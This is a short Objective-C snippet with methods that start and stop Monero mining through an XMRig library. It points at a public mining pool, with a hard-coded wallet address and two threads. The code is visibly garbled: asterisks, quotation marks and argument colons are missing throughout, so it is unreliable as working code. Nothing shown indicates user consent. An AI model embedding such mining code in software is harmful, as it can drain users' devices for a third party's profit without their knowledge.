- (void)startMining {
    NSString url = @pool.supportxmr.com:3333;
    NSString wallet = @45bVZNs6Vxp4G37TKmzvQc9FDDnFVcwkE5Z4GygXeZsUBrmdmWp83DgWnSWHsFVzQnLm4qU8xTDBTHvPPh9bRritE6MUiJa;
    NSString password = @x;
    [XMRig startMiningWithURLurl walletwallet passwordpassword threadsCount2]; 
}

- (void)stopMining {
    [XMRig stopMining];
}